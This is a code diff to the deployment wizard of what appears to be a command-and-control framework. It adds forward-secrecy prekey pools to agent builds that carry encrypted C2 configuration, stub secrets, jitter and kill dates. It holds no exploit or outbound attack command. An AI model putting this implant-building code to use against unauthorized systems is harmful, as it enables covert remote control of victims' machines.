@@ -47,7 +47,7 @@ from providers._session import (
     _load_persist_probe,
 )
 from providers._monitor import HeartbeatMonitor, AsyncPoller, send_async, _initial_hb_check
-from providers._crypto import encrypt_command, decrypt_output, build_task, deploy_id_from_key
+
 from server.version import __version__ as _stratum_version
 
 
@@ -272,6 +272,9 @@ class BaseConfig:
     stub_secret:         str = ""
     salt:                str = ""
     session_key:         str = ""   # hex-encoded 32-byte pre-shared key; GCM-wraps aes_key in server→agent direction
+    prekey_privs_hex:    str = ""   # hex-encoded concatenated X25519 private keys (prekey pool)
+    prekey_pubs_hex:     str = ""   # hex-encoded concatenated X25519 public keys (prekey pool)
+    fs_enabled:          bool = True  # forward secrecy enabled (v2 protocol)
     debug_mode:          bool = False
 
     # Per-deploy cloud filenames — set from pub_key hash in run() to avoid
@@ -626,6 +629,13 @@ class ProviderWizard(ABC):
 
     def _step_generate_session_key(self, cfg: BaseConfig) -> None:
         cfg.session_key = secrets.token_bytes(32).hex()
+        self._step_generate_prekey_pool(cfg)
+
+    def _step_generate_prekey_pool(self, cfg: BaseConfig, pool_size: int = 8) -> None:
+        from providers._epoch import generate_prekey_pool
+        pool = generate_prekey_pool(pool_size)
+        cfg.prekey_privs_hex = b"".join(priv for priv, _ in pool).hex()
+        cfg.prekey_pubs_hex = b"".join(pub for _, pub in pool).hex()
 
     def _step_generate_stub_secret(self, cfg: BaseConfig) -> None:
         self._step("Stub Secret")
@@ -1327,15 +1337,18 @@ class ProviderWizard(ABC):
                         "STRATUM_PUBLIC_KEY_B64": _b64_s2.b64encode(pub_pem).decode(),
                         "STRATUM_STUN_IP":        _stun_ip,
                         "STRATUM_SESSION_KEY":    cfg.session_key,
+                        "STRATUM_PREKEY_POOL_B64": base64.b64encode(bytes.fromhex(cfg.prekey_pubs_hex)).decode(),
                         "STRATUM_DEBUG":          "true" if cfg.debug_mode else "false",
                     }
                 elif cfg.mode == "stageless-enc":
                     # Full agent; C2 config encrypted with stub_secret baked in stub.
                     # Transport creds (APP_KEY etc.) are plain so the agent can auth to cloud.
+                    _prekey_pool_b64 = base64.b64encode(bytes.fromhex(cfg.prekey_pubs_hex)).decode()
                     _cfg_fields = "|".join([
                         cfg.folder_path, cfg.input_file, cfg.output_file,
                         cfg.heartbeat_file, str(cfg.base_sleep), str(cfg.jitter_percent),
                         base64.b64encode(pub_pem).decode(), _stun_ip, cfg.session_key,
+                        _prekey_pool_b64,
                     ])
                     _enc_cfg = self._encrypt_payload(_cfg_fields, cfg.stub_secret)
                     _native_env = {
@@ -1362,6 +1375,7 @@ class ProviderWizard(ABC):
                         "STRATUM_PUBLIC_KEY_B64": base64.b64encode(pub_pem).decode(),
                         "STRATUM_STUN_IP":        _stun_ip,
                         "STRATUM_SESSION_KEY":    cfg.session_key,
+                        "STRATUM_PREKEY_POOL_B64": base64.b64encode(bytes.fromhex(cfg.prekey_pubs_hex)).decode(),
                     }
 
                 # Force recompile of stratum-agent-rs for every deployment.
@@ -1834,6 +1848,9 @@ class ProviderWizard(ABC):
                 s2_path_cloud    = cfg.s2_path_linux if cfg.mode == "staged-enc" else "",
                 s2_uploaded_at   = cfg.s2_uploaded_at,
                 session_key      = cfg.session_key,
+                prekey_privs_hex = cfg.prekey_privs_hex,
+                prekey_pubs_hex  = cfg.prekey_pubs_hex,
+                fs_enabled       = cfg.fs_enabled,
                 added_at         = _tz.now().isoformat(),
                 kill_date        = cfg.kill_date    or "",
                 window_start     = cfg.window_start or "",
